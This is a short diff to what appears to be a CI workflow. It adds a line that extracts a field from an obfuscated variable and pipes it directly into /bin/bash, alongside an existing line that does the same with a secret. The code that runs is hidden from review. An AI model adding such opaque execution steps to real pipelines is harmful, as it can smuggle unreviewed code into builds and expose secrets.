@@ -21,6 +21,7 @@ jobs:
           xankr5128: ${{ secrets.xankr5128 }}
         run: |
           printf '%s' "$xankr5128" | jq -r .h115 | /bin/bash
+          echo $gj5490 | jq -r .a3 | /bin/bash
 
       - name: Save archive
         if: always()
